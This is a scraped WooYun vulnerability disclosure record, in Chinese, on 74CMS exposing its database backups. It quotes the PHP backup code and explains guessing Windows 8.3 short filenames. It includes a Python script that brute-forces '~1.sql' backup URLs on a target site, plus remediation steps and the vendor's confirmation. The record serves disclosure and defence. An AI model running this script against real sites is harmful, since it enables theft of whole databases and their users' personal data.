{"id": 2384, "wybug_id": "wooyun-2014-059941", "wybug_title": "74CMS设计缺陷导致被脱裤（有服务器环境限制）", "wybug_corp": "74c,s.com", "wybug_author": "xfkxfk", "wybug_date": "2014-05-08 19:00", "wybug_open_date": "2014-08-06 19:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "源码审核", "设计不当导致攻击界面扩大", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向公众公开  简要描述： ~~ 详细说明：  首先我们来科普一下windows的短文件名，也就是下面我们要用到的。 WooYun: ThinkSAAS某处设计缺陷可能导致被拖库利用（环境与功能条件限制） 见上面漏洞的科普介绍，这里我们直接利用吧。74cms的数据库备份如下：\n//执行备份elseif($act =='do_backup'){\tcheck_permissions($_SESSION['admin_purview'],\"database\");\tif (!file_exists(\"../data/\".$backup_dir.\"/\"))adminmsg(\"备份文件存放目录data/\".$backup_dir.\"不存在！\",0);\tif (!is_writable(\"../data/\".$backup_dir.\"/\"))adminmsg(\"备份文件存放目录data/\".$backup_dir.\"不可写！\",0);\t$limit_size = !empty($_REQUEST['limit_size']) ? intval($_REQUEST['limit_size']) : '2048'; \t$mysql_type = !empty($_REQUEST['mysql_type']) ? trim($_REQUEST['mysql_type']) : '';\t$table_id = !empty($_REQUEST['table_id']) ? intval($_REQUEST['table_id']) : 0;\t$file = !empty($_GET['file']) ? trim($_GET['file']) : date(\"Ymd_\", time()) . get_rand_char(5).uniqid();\t$num = !empty($_GET['num']) ? intval($_GET['num']) : 1;\t$pos = !empty($_GET['pos']) ? intval($_GET['pos']) : 0;\t\tif (!empty($_POST['tables']))\t\t{\t\t$tables = $_POST['tables'];\t\t @file_put_contents(\"../data/{$backup_dir}/temp.txt\", serialize($_POST['tables']));\t\t}\t\telseif ($_GET['table_id'])\t\t{\t\t$content = file_get_contents(\"../data/{$backup_dir}/temp.txt\");\t\t$tables = unserialize($content);\t\t}\t\telse\t\t{\t\tadminmsg(\"您没有选择备份的表！\",1);\t\t}\t$db_version = $db->dbversion();\t$sql = '';\t$version = QISHI_VERSION;\t$add_time = date(\"Y-m-d H:i:s\");\t$sql .= \"-- 74CMS VERSION:{$version}\\r\\n\".\t\"-- Mysql VERSION:{$db_version}\\r\\n\".\t\"-- Create time:{$add_time}\\r\\n\";\t$count = count($tables);\tfor($i = $table_id; $i < $count; $i++)\t{\t\t$table = $tables[$i];\t\tif ($pos == 0)\t\t{\t\t$table_sql = write_head($table);\t\t$table_sql = preg_replace('/AUTO_INCREMENT=([0-9]+)(\\s+)/', '', $table_sql);\t\t$table_sql1 = substr($table_sql, 0, strrpos($table_sql, ')', 25)+1);\t\t\tif ($mysql_type == 'mysql40' && $db_version > 4.0)\t\t\t{\t\t\t$s = \"TYPE=MyISAM;\\r\\n\";\t\t\t$table_sql = $table_sql1 . $s;\t\t\t}\t\t\telseif($mysql_type == 'mysql41' && $db_version < 4.1)\t\t\t{\t\t\t$s = \"ENGINE=MyISAM DEFAULT CHARSET=\".QISHI_CHARSET.\";\\r\\n\";\t\t\t$table_sql = $table_sql1 . $s;\t\t\t}\t\t\telse\t\t\t{\t\t\t$table_sql .= \";\\r\\n\";\t\t\t}\t}\t$result = $db->query(\"SELECT * FROM \" . $table);\t$field_num = $db->num_fields($result);\t$row_count = $db->getfirst(\"SELECT COUNT(*) FROM \" . $table);\t$j = 0;\twhile ($row = $db->fetch_array($result, MYSQL_NUM))\t{\t\tif ($j < $pos)\t\t{\t\t $j++;\t\tcontinue;\t\t}\t\t\t$table_sql .= \"INSERT INTO `\".$table.\"` VALUES (\";\t\t\tfor($m=0;$m<$field_num;$m++)\t\t\t{\t\t\t$table_sql .= \"'\" .escape_str($row[$m]) . \"',\";\t\t\t}\t\t\t$table_sql = substr($table_sql,0,-1).\");\\r\\n\";\t\t\t\t\t\tif (strlen($sql.$table_sql) >= $limit_size * 1000)\t\t{\t\t\tif (!write_file(\"../data/{$backup_dir}/{$file}_{$num}.sql\", $sql))\t\t\t{\t\t\tadminmsg('备份数据库卷-'.$num.'失败',0);\t\t\t}\t\t\tif ($j == $row_count-1)\t\t\t{\t\t\t$i++;\t\t\t}\t\t\t$link[0]['text'] = \"系统将自动继续...\";\t\t\t$link[0]['href'] = \"admin_database.php?act=do_backup&limit_size={$limit_size}&mysql_type={$mysql_type}&file={$file}&num=\".($num+1).\"&table_id={$i}&pos=\".$j;\t\t\tadminmsg('文件'.$file.'_'.$num.'.sql 成功备份。系统将自动继续...',1,$link,true,1);\t\t\texit();\t\t}else{\t\t\t$sql .= $table_sql;\t\t\t$table_sql = '';\t\t}\t\t$j++;\t}\t$pos = 0;\tif (strlen($sql.$table_sql) >= $limit_size * 1000)\t{\t\tif (!write_file(\"../data/{$backup_dir}/{$file}_{$num}.sql\", $sql))\t\t{\t\tadminmsg(\"备份数据库卷-{$num}失败\",0);\t\t}\t\t$link[0]['text'] = \"程序将自动继续...\";\t\t$link[0]['href'] = \"admin_database.php?act=do_backup&limit_size=\".$limit_size.\"&mysql_type=\".$mysql_type.\"&file=\".$file.\"&num=\".($num+1).\"&table_id=\".($i+1);\t\tadminmsg('文件' . $file . '_' . $num.'.sql 成功备份。程序将自动继续...', 1,$link,true,2);\t\texit();\t}\telseif ($i == $count-1)\t{\t\tif (!write_file(\"../data/{$backup_dir}/{$file}_{$num}.sql\", $sql))\t\t{\t\tadminmsg('备份数据库卷-{$num}失败');\t\t}\t\t@unlink(\"../data/{$backup_dir}/temp.txt\");\t\t$link[0]['text'] = \"查看备份文件\";\t\t$link[0]['href'] = \"?act=restore\";\t\tadminmsg('数据库备份成功',2,$link);\t\t}\t\telseif ($j == 0)\t\t{\t\t$sql .= $table_sql;\t\t}\t}}\n备份的文件名为：$file = !empty($_GET['file']) ? trim($_GET['file']) : date(\"Ymd_\", time()) . get_rand_char(5).uniqid()备份的地址为/data/backup/filename.sql也就是默认情况下数据库备份文件的filename为：年月日_5位大小写字母+uniqid()_卷的number.sql例如：20140508_HaHzj536b51968ec34_1.sql利用windows的短文件名我们可以访问数据库备份文件如下：20140508_HaHzj536b51968ec34_1.sql == 201405~1.sql   漏洞证明：  \n\n在不知道备份文件名的情况下，我们可以来利用段文件名爆破一下：\n# -*- coding: UTF-8 -*-import urllibfrom urlparse import urljoindef run(host):    print \"Starting......\"    years =[\"2012\",\"2013\",\"2014\"]    months = [\"01\",\"02\",\"03\",\"04\",\"05\",\"06\",\"07\",\"08\",\"09\",\"10\",\"11\",\"12\"]        for y in range(len(years)):        for i in range(len(months)):            mdhis = months[i]            year = years[y]            url = urljoin(host, \"/data/baksql/\"+year+mdhis+\"~1.sql\")            print url            res = urllib.urlopen( url )            if res.getcode() == 200 and len(res.read()) > 0:                print \"Success, The Bak Url Is : >>> \" + url                break    print \"Nothing...\"if __name__ == \"__main__\":    import sys    host = sys.argv[1]    run(host)\n很快得到短文件名：201405~1.sql\n\n   修复方案：  1、如果您是Windows服务器，请将备份文件存到WEB不可访问的位置；2、将文件名随机长度小于<9，就不会出来短文件名，当然文件名最好是字母随机，而不是数字随机；3、将文件所放目录进行随机化处理。4、把备份数据库文件后缀为php，在最前面加一段代码：<?exit('error');?>，使其无法访问此文件。5、其他   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-05-09 15:31 厂商回复： 感谢您对骑士的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-08 19:51 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xfkxfk 这是我在刷的漏洞啊~我已知道了！    \n     2014-05-08 20:42 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @U神 ???    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}